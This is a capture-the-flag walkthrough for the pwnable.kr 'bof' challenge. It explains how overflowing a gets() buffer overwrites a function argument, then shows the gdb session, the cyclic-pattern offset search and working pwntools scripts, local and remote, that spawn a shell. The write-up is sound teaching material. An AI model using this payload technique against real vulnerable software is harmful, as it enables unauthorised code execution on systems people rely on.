# pwnable.kr — `bof` Walkthrough

A reference for the **bof** challenge on <https://pwnable.kr/play.php>. This is a
classic stack buffer overflow where the goal is not to smash the return address,
but to **overwrite a function argument** so a comparison passes and spawns a shell.

I learned and practiced with this following wetw0rk's tutorial video (huge thanks to him!):
<https://www.youtube.com/watch?v=A-P2bhxzK1Y>

Disclaimer: I used Claude to help draft this, but it's not slop I promise :)

---

## 0. Tools needed

| Tool | What for | Install |
|------|----------|---------|
| **Kali Linux** | Default working environment (Ubuntu works too — but why tho) | — |
| **gdb** | Dynamic analysis: break, step, inspect memory at runtime | `sudo apt install gdb` |
| **pwntools** | Provides `cyclic` / `cyclic_find` (offset math) and `p32` (byte packing) | see below |

### Installing pwntools (read this — there's a gotcha)

```bash
pipx install pwntools          # what I used
# or
pip install pwntools --break-system-packages   # Kali ships a managed Python; this flag avoids the nag
```

**Gotcha I hit:** after `pipx install`, the standalone `cyclic` command was "not found",
and `python3 -c "from pwn import *"` couldn't import it either. That's because **pipx
installs into its own isolated venv**, so your normal `python3` can't see the `pwn`
module. Two fixes:

- Expose the library to your system Python: `pipx inject pwntools pwntools`
- Or just also do `pip install pwntools --break-system-packages`

For a library you `import` in one-liners (rather than a CLI you run as a command),
`pip install --break-system-packages` is the less fiddly choice. `pipx` is better for
standalone command-line tools.

> Note: `cyclic` isn't a separate install — it ships *inside* pwntools. We mostly use the
> Python functions `cyclic()` and `cyclic_find()` rather than the standalone command, since
> those work regardless of PATH issues.

We use **plain gdb** for the whole debugging session — no plugin (pwndbg/GEF) required.

---

## 1. The vulnerability

The challenge source C code is roughly:

```c
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);              // <-- no bounds checking
    if(key == 0xcafebabe){
        system("/bin/sh");         // <-- the goal
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);              // key is set to 0xdeadbeef
    return 0;
}
```

There are 2 facts here that make this exploitable:

1. **`gets()` has no length limit.** It copies stdin into the 32-byte buffer until a
   newline, happily writing past the end of the buffer into whatever memory follows.
2. **`key` is compared *after* `gets()` runs.** `key` is set to `0xdeadbeef` when
   `main` calls `func`, but the `cmp` against `0xcafebabe` happens *after* our input
   is read. That gap is the attack window.

**Mental model:** `key` is set → *we get to write memory* → `key` is read.
We reach across the stack with the overflow and overwrite the stored copy of `key`
*after* it's set but *before* it's compared.

### Stack layout (low address at top, high at bottom)

```
[ overflowme[32] ]   <- our input starts here (low address)
[ alignment pad  ]   <- compiler-added padding (this is why the offset > 40)
[ saved EBP (4)  ]
[ saved ret (4)  ]
[ key  (ebp+8)   ]   <- the target (high address)
```

`gets()` writes upward (toward higher addresses), so a long enough input flows from
the buffer through saved EBP and the saved return address and lands on `key`.

---

## 2. GDB session — finding where our input lands

Launch GDB on the binary:

```bash
gdb ./bof
```

### Set Intel syntax (so disassembly reads `mov dst, src`)

```gdb
set disassembly-flavor intel
```

> Note: the real command is `set disassembly-flavor intel`, not "set flavor to intel".

### Auto-print context on every stop

`hook-stop` defines commands GDB runs automatically every time execution halts (any
breakpoint or step), so you see registers + nearby disassembly without retyping:

```gdb
define hook-stop
  info registers
  disassemble $eip,+10
end
```

> Note: the command is `hook-stop` (with a hyphen), not "hookstop".

### Break at the very first instruction of main

```gdb
b *main
```

`b *main` breaks at the **exact address** of main's first instruction. The `*` matters:
plain `b main` skips the function prologue and breaks *after* the stack frame is set up,
whereas `b *main` stops before anything runs. Useful when you want to watch setup.

### Look at the code, then run

```gdb
disassemble main
r
disassemble func
```

### Break at the comparison

```gdb
b *func+40
```

`func+40` is the address of the `cmp DWORD PTR [ebp+0x8], 0xcafebabe` instruction —
i.e. **right after `gets()` has returned** (so our input is already in memory) and
**right before the comparison**. Stopping here lets us inspect what value is currently
sitting in `key`'s slot. (Confirm the exact offset from your own `disassemble func`
output; it may differ slightly per build.)

```gdb
c
```

### Feed the cyclic pattern

When prompted with `overflow me :`, paste a 200-byte cyclic (De Bruijn) pattern.
Generate it locally first (see section 3) and paste it, or feed it from a file.

A cyclic pattern is a string where every 4-byte chunk is unique, so wherever it lands
we can identify the exact position from the 4 bytes we see.

### Read the value sitting on `key`

```gdb
x/x $ebp+0x8
```

Example output:

```
0xffffce60:    0x6161616e
```

- Left (`0xffffce60`) = the **address** of `key`'s slot — ignore for the offset.
- Right (`0x6161616e`) = the **value** there now. It's pattern bytes (`a a a n`, all in
  the `0x61`–`0x7a` ASCII range), **not** `0xdeadbeef`. That confirms our overflow
  reached `key` and overwrote it. The slot is ours to control.

---

## 3. Finding the offset locally (run this on your Kali)

The 4 bytes (`0x6161616e`) act as a unique coordinate into the pattern. The cyclic
sequence is deterministic, so `cyclic_find` regenerates it and looks up the position —
it needs nothing but those 4 bytes (not the filler, not the length).

Generate the pattern:

```bash
python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))" > pattern.txt
```

Look up the offset from the value you observed:

```bash
python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"
# -> 52
```

`cyclic_find` handles the little-endian byte reversal internally, so you don't hand-flip
bytes and miscount.

**Why 52 and not 40?** Buffer (32) + saved EBP (4) + saved return address (4) = 40, but
the compiler added alignment padding below the buffer, pushing the real distance to 52.
This is exactly why you *measure* the offset instead of assuming it — a hand-count of 40
would silently fail.

---

## 4. Building the payload

```bash
python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))" > payload.txt
```

What this produces — **raw bytes, not ASCII text**:

- `b'A'*52` — 52 filler bytes (`0x41`). The content is irrelevant; only the *count*
  matters, so the next bytes land exactly on `key`.
- `p32(0xcafebabe)` — packs the value into 4 raw little-endian bytes: `be ba fe ca`.
  We must NOT send the text `"cafebabe"` (that's 8 ASCII letter-bytes `63 61 66 65...`,
  the wrong value). `p32` emits the actual bytes AND reverses them for little-endian.
- `sys.stdout.buffer.write(...)` — writes the raw byte channel. Plain `print` would
  re-encode as text and append a newline, corrupting the non-printable bytes.

Inspect the payload to see the raw bytes:

```bash
xxd payload.txt
```

```
00000030: 4141 4141 beba feca                      AAAA....
```

The `A`s render on the right; `beba feca` shows as dots because those bytes have no
printable form — that's `0xcafebabe` sitting in the payload.

Payload structure:

```
[ 52 bytes of 'A' filler ]  +  [ be ba fe ca ]   = 56 bytes total
        spans to key              lands on key
```

---

## 5. Delivering it — and keeping the shell alive

`system("/bin/sh")` opens an **interactive** shell. If you just redirect the payload in,
stdin hits end-of-file the instant the payload is consumed, so the shell opens and
immediately dies — looks like a failure even though the exploit worked.

### Fix A — keep stdin open with `cat` (local binary)

```bash
(python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))"; cat) | ./bof
```

The trailing `cat` keeps feeding your keystrokes to the live shell after the payload, so
it stays open. Then type `id`, `ls`, `cat flag`, etc.

### Fix B — pwntools (cleaner, recommended)

Local:

```python
from pwn import *
p = process('./bof')
p.sendline(b'A'*52 + p32(0xcafebabe))
p.interactive()
```

Remote (this is how you actually capture the flag on pwnable.kr — the `bof` service
listens on port 9000):

```python
from pwn import *
p = remote('pwnable.kr', 9000)
p.sendline(b'A'*52 + p32(0xcafebabe))
p.interactive()
```

`p.interactive()` hands you a live session. Run `cat flag` to grab the flag.

---

## 6. Key takeaways

- **The bug is intent vs. mechanism.** The programmer expected `gets()` to read a short
  line of text; the CPU just copies bytes until a newline. Feeding raw non-printable
  bytes into something built for text is the whole attack.
- **Overwriting a variable, not the return address.** This challenge flips a comparison.
  Overwriting the *saved return address* (the slot just below `key`) is the next step up —
  that redirects execution rather than changing a value.
- **Endianness everywhere.** Both reading (`x/x` shows `0x6161616e` = stored `6e 61 61 61`)
  and writing (`p32` emits `be ba fe ca`) involve the little-endian reversal. Let the
  tools do it.
- **Measure, don't assume.** The 52-byte offset (not the naive 40) only showed up because
  we measured with a cyclic pattern.
- **Why it works at all:** this binary was built with protections off. A **stack canary**
  would sit between the buffer and the saved registers and catch the smash before the
  `cmp` ever runs. That mitigation is precisely what this technique teaches you to
  recognize when it later stops your clean overflow from working.

---

## Quick command reference

```bash
# 0. install (pick one)
pipx install pwntools && pipx inject pwntools pwntools
pip install pwntools --break-system-packages

# 1. generate pattern, feed to program under gdb, read x/x $ebp+0x8
python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))" > pattern.txt

# 2. find offset from the observed value
python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"      # -> 52

# 3. build payload (raw bytes)
python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))" > payload.txt

# 4. fire locally, keeping the shell alive
(python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))"; cat) | ./bof

# 4b. or fire at the real challenge
python3 -c "from pwn import *; p=remote('pwnable.kr',9000); p.sendline(b'A'*52+p32(0xcafebabe)); p.interactive()"
```
